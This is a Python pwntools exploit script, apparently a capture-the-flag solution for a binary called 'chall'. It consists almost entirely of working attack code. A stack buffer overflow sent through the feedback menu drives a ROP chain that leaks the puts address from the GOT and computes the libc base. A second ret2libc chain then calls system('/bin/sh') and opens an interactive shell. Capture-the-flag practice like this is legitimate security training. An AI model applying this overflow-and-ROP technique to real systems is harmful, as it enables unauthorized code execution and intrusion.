#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
elf = context.binary = ELF(args.EXE or 'chall')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

p = start()

def safe_flat(*args, unsafe_chars=b"\n", **kwargs):
    p = flat(*args, **kwargs)
    if any(c in unsafe_chars for c in p):
        raise ValueError("unsafe :",p)
    return p

mov_rdi_rax = 0x00000000004014ef

def bof(payload):
    p.sendlineafter(b'choice: ',b'3')
    p.sendlineafter(b'feedback: ',payload)

bof(safe_flat({64: [elf.bss(0x800), elf.sym['readint'], 0x000000000040164a]})) #  0x000000000040164a <+217>:   mov    rdi,rax
p.sendline(str(elf.got.puts).encode())
# leak = p.recv().split(b'\n\n')[0]
leak = unpack(p.recv().split(b'\n\n')[0].ljust(8,b'\x00'))
libc.address = leak - libc.sym.puts
success(f'leak puts @ {hex(leak)}')
success(f'libc address @ {hex(libc.address)}')

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))
pop_rdi = libc.address + 0x000000000002a145
system = libc.address + 0x0000000000053110
bin_sh = libc.address + 0x1a7ea4
ret = 0x0000000000401016

rop_ceng = flat(
    pop_rdi,
    bin_sh,
    ret,
    ret,
    system
    )

p.sendline(b'a')
#bof(safe_flat({64: [elf.bss(0x30),rop.chain()]}))
bof(flat({64: [elf.bss(0x20),rop_ceng]}))
p.interactive()

